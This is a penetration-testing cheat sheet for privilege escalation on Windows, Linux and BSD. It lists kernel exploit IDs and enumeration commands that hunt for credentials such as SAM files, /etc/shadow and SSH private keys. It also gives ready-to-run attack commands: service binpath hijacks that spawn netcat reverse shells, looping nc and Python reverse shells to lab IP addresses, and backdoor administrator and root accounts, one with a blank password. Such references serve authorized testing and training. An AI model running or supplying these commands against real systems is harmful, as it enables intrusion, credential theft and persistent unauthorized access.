# Windows

### Kernel Exploits 
* `afd.sys up to Win7/2008 EID 40564 (compile with: 'i686-w64-mingw32-gcc 40564.c -lws2_32 -o 40564.exe')`
* `afd.sys XP/2003 EID 18176`
* `EternalBlue MS17-10 (nmap scan) EID 42030 42315 42031`
* `Rotten Potato` (Windows Service account -> SYSTEM) https://github.com/foxglovesec/RottenPotato

### Enumeration
```
 ○ set - retrieve env vars, often incl. processor and architecture
 ○ gci env:
 ○ ver
 ○ hostname
 ○ ipconfig /all
 ○ echo %username%
 ○ systeminfo
 ○ tasklist , tasklist /svc , reg query hklm\software, dir /a "C:\Program Files" (and (x86)), Get-Process
 ○ schtasks /query /fo list /v
 ○ wmic startup get caption,command
 ○ driverquery
 ○ wmic qfe get Caption,Description,HotFixID,InstalledOn
 ○ wmic logicaldisk get caption,description,providername
 ○ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
 ○ route print, arp -A, netstat -ano, C:\WINDOWS\System32\drivers\etc\hosts
 ○ netsh firewall show state / show config, netsh advfirewall firewall show rule all
 ○ net users, net user <username>, net localgroup, net view, net start/stop, net use
 ○ Get-LocalUser, Get-LocalGroup, Get-LocalGroupMember Administrators
 ○  gci c:\users -force, dir /b /ad "c:\users\" (or "C:\documents and settings\") 
 ○ qwinsta
 ○ cmdkey /list
 ○ dir C:\Users\username\AppData\Local\Microsoft\Credentials\ , dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ○ SAM files: %SYSTEMROOT%\repair\SAM, %SYSTEMROOT%\System32\config\RegBack\SAM, %SYSTEMROOT%\System32\config\SAM, %SYSTEMROOT%\repair\system, %SYSTEMROOT%\System32\config\SYSTEM, %SYSTEMROOT%\System32\config\RegBack\system
 ○ accesschk (Note: Must use different version for XP, Win 2K3)
    ○ Directories: accesschk /accepteula -uwdqs "Authenticated Users" c:\  (also try Everyone, Users)
    ○ Files:       accesschk /accepteula -uwqs  "Authenticated Users" c:\*.*  (also try Everyone, Users)
    ○ Services:    accesschk /accepteula -ucqvw "Authenticated Users" *  (also try Everyone, Users)    
 ○ sc query     
    ○ sc qc ssdpsrv
 ○ wmic service get startname,name,displayname,pathname | findstr /i "program files" 
 ○ wmic service get name,displayname,pathname,startmode | findstr /i /v "c:\windows" | findstr /i /v """ (unquoted svc path)
 ○ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ○ icacls "c:\program files" /T | findstr Users
    ○ or older cacls
 ○ dir /b /s web.config
    ○ unattended.xml
    ○ unattend.xml
    ○ sysprep.inf 
    ○ sysprep.xml
    ○ *pass*
    ○ vnc.ini
 ○ dir /b /s *pass* == *cred* == *vnc* == *.config*
 ○ dir /a-r-d /s /b (find writable files)
 ○ findstr /si password *.xml *.ini *.txt
 ○ reg query HKLM /s /f password
 ○ reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
 ○ reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
 ○ reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
 ○ reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
 ○ Always Install Elevated
    ○ reg query "HKLM\Software\Microsoft\Windows NT\Installer" /v AlwaysInstallElevated
    ○ reg query "HKCU\Software\Microsoft\Windows NT\Installer" /v AlwaysInstallElevated
    ○ msiexec /quiet /qn /package malicious.msi
 ○ %appdata% %ProgramData% (or $env:programdata, $env:appdata)
```

### Escalation
```
 ○ weak service permissions
    ○ sc config upnphost binpath= "C:\nc.exe -nv 10.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
    ○ sc config upnphost obj= ".\LocalSystem" password= ""
    ○ net start upnphost
    ○ sc config ssdpsrv binpath= "C:\nc.exe -nv 10.0.0.1  9988 -e C:\WINDOWS\System32\cmd.exe" start= auto obj= ".\LocalSystem" password= ""
    ○ sc config ssdpsrv binpath= "cmd /c net user hack3 potato /add && net localgroup administrators hack3 /add && net localgroup """remote desktop users""" hack3 /add" start= auto obj= ".\LocalSystem" password= ""
    ○ With sc config: Might need to set depend= "" as well
 ○ at
 ○ DLL hijacking
 ○ Enable RDP
    ○ netsh firewall set service RemoteDesktop enable -OR- netsh firewall set service type = remotedesktop mode = enable
    ○ reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
    ○ reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
```

### Tools
```
 ○ powersploit powerup
 ○ Get 64-bit powershell from 32-bit shell/process: `c:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe` (this virtual directory is only available to 32-bit apps)
 ○ jaws-enum.ps1 -OutputFileName enum.txt
 ○ https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1
 ○ windows-exploit-suggester.py (takes systeminfo output as input) https://github.com/GDSSecurity/Windows-Exploit-Suggester
 ○ windows-privesc-check2.exe (TMI, DON'T dump all) https://github.com/pentestmonkey/windows-privesc-check
 ○ churrasco.exe - upgrade from 'network service' to 'system' (/usr/share/sqlninja/apps/churrasco.exe)
 ○ mimikatz
    ○ Launch SYSTEM cmd: `token::elevate` `process::runp` `misc::cmd`
 ○ SysInternals
    ○ Accesschk.exe
        ○ accesschk -uwqds Everyone c:\
        ○ accesschk -uwqds Users c:\
        ○ accesschk -uwqds "Authenticated Users" c:\
        ○ accesschk.exe -ucqv upnphost
    ○ PsExec.exe - admin to system = psexec -s -i cmd.exe  
    ○ ProcMon
 ○ Compile python win exploits: /var/lib/veil/PyInstaller-3.2.1/pyinstaller.py --onefile xxx.py
```

### Post-Exploitation/Persistence
* Resilient nc.exe shell 
```
@REM echo for /l %%x in (1,1,9999) do (nc.exe 10.11.0.50 4000 -e cmd.exe )>callme.bat
for /l %%x in (1,1,999999) do (c:\temp\nc.exe 10.11.0.50 5000 -e cmd.exe )
   ```
* Add a new user 
 ```
 net user hack potato /add 
 net localgroup administrators hack /add 
 net localgroup "remote desktop users" hack /add
 ```

### Link Dump
* http://www.fuzzysecurity.com/tutorials/16.html
* https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md
* https://pentestlab.blog/2017/04/24/windows-kernel-exploits/ (Windows Kernel exploit table by version @ bottom)
* http://www.bhafsec.com/wiki/index.php/Windows_Privilege_Escalation - includes big list of kernel exploits

# Linux

### Important Note: Some kernel exploits won't work without a proper shell
 **Always upgrade shell** `python -c 'import pty; pty.spawn("/bin/bash")'` 

### Kernel Exploits

* ` Kernel 2.6.22 - 3.9 dirtycow (firefart) EID 40839`
* ` Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper' EID 18411`
* ` Linux Kernel 2.4.x/2.6.x - 'sock_sendpage()' Local Privilege Escalation EID 9545 (may need to compile with 'gcc -m32 -Wl,  --hash-style=both 9545.c -o 9545')`
* `ReiserFS (Linux Kernel 2.6.34-rc3 / RedHat / Ubuntu 9.10) - 'xattr' Local Privilege Escalation EID 12130`
* `Linux Kernel <= 2.6.36-rc8 - 'RDS Protocol' EID 15285`


### Enumeration
## OS
* `cat /etc/issue` , `cat /etc/*-release`
* `cat /proc/version`
* `uname -a`, `uname -mrs`
* `env`
* `set`
* `mount`
* `rpm -q kernel`
* `dmesg | grep Linux`
* `ls /boot | grep vmlinuz`
* `cat /etc/profile`
* `cat ~/.bash*`
* `mount`, `df -h`

## Network
* `/sbin/ifconfig -a`
* `cat /etc/network/interfaces`
* `cat /etc/sysconfig/network`
* `lsof -i`
* `lsof -i :80`
* `grep 80 /etc/services`
* `netstat -antup`
* `netstat -antpx`
* `netstat -tulpn`
* `chkconfig --list`, `chkconfig --list | grep 3:on`
* `tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21`
* `strace`
* `host -l <domain> <nameserver>`

## Users and Sensitive Files
* `id`
* `who`
* `w`
* `last`
* `cat /etc/sudoers`
* `sudo -l`
* `cat /etc/passwd`
* `cat /etc/group`
* `cat /etc/shadow`
* `ls -alh /var/mail/`
* `cat /etc/sudoers`
* `ls -ahlR /root/`
* `ls -ahlR /home/`
* `ls -alh ~/.*history`
* Web server
  * `ls -alhR /var/www/`
  * `ls -alhR /srv/www/htdocs/`
  * `ls -alhR /usr/local/www/apache22/data/`
  * `ls -alhR /opt/lampp/htdocs/`
  * `ls -alhR /var/www/html/`
* private keys?
  * `cat ~/.ssh/authorized_keys`
  * `cat ~/.ssh/identity.pub`
  * `cat ~/.ssh/identity`
  * `cat ~/.ssh/id_rsa.pub`
  * `cat ~/.ssh/id_rsa`
  * `cat ~/.ssh/id_dsa.pub`
  * `cat ~/.ssh/id_dsa`
  * `cat /etc/ssh/ssh_config`
  * `cat /etc/ssh/sshd_config`
  * `cat /etc/ssh/ssh_host_dsa_key.pub`
  * `cat /etc/ssh/ssh_host_dsa_key`
  * `cat /etc/ssh/ssh_host_rsa_key.pub`
  * `cat /etc/ssh/ssh_host_rsa_key`
  * `cat /etc/ssh/ssh_host_key.pub`
  * `cat /etc/ssh/ssh_host_key`

## Find plaintext passwords
* `grep -iR user [dir]` (-R for recursive)
* `grep -iR pass [dir]`
* `grep -C 5 "password" [filename]` (-C for context lines count)
* `find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"`

## Applications and Services
* `ps aux`, `ps aux | grep root`
* `ps -ef`, `ps -ef | grep root`
* `pspy`
* `top`
* `cat /etc/services`
* Check for interesting installed software
   * `which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null`
   * `find / -name perl* 2> /dev/null`
   * `find / -name python* 2> /dev/null`
   * `find / -name gcc* 2> /dev/null`
   * `find / -name nc* 2> /dev/null`
   * etc...
* `dpkg -l`
* `rpm -qa`
* `cat /etc/syslog.conf`
* `cat /etc/chttp.conf`
* `cat /etc/lighttpd.conf`
* `cat /etc/cups/cupsd.conf`
* `cat /etc/inetd.conf`
* `cat /etc/apache2/apache2.conf`
* `cat /etc/my.conf`
* `cat /etc/httpd/conf/httpd.conf`
* `cat /opt/lampp/etc/httpd.conf`

## Scheduled jobs
* `crontab -l`
* `ls -alh /var/spool/cron`
* `ls -al /etc/ | grep cron`
* `cat /etc/cron*`
* `cat /etc/at.*`
* `cat /etc/cron*`
* `cat /var/spool/cron/crontabs/root`

## Setuid and other interesting file permissions
* SGID: `find / -perm -g=s -type f 2>/dev/null`
* SUID: `find / -perm -u=s -type f 2>/dev/null`
* SGID or SUID with details: `find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2>/dev/null`
* Quicker, only searches some dirs: ```for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done```
* sticky bit dirs: `find / -perm -1000 -type d 2>/dev/null`
* world-writeable
  * `/tmp`, `/var/tmp`, `/dev/shm`
  * `find / -writable -type d 2>/dev/null      # world-writeable folders`
  * `find / -perm -222 -type d 2>/dev/null     # world-writeable folders`
  * `find / -perm -o w -type d 2>/dev/null     # world-writeable folders`
  * `find / -perm -o x -type d 2>/dev/null     # world-executable folders`
  * `find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders`
  * `find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files`
  * `find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files`

### Tools
* `linux-exploit-suggester.sh`
* `linuxprivchecker.py`
* `linux-enum-mod.sh`


### Post-Exploitation/Persistence
 * Add a new root user (classic) `/usr/sbin/useradd -ou 0 -g 0 hackerman` then `echo "hackerman:potato"|/usr/sbin/chpasswd`
 * Add a new root user (blank pwd) `echo hackerman2::0:0:root:/root:/bin/bash >> /etc/passwd`
 * Reslient nc shell `while true; do /bin/netcat 10.11.0.35 3000 -e /bin/bash ; done;`
 * Resilient python shell `while true; do python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.35",5000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'; done;`

### Link Dump
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

# BSD

### Kernel Exploits
```
 ○ FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation EID 28718
```

### Key Differences from Linux
```
 ○ /usr/bin/fetch instead of wget
 ○ wheel group instead of root group
```

### Post-Exploitation/Persistence
 ○ Add a new user `echo "potato" | pw useradd -n hack -s /bin/sh -m -g 0 -ou 0 -d /home/hack -h 0`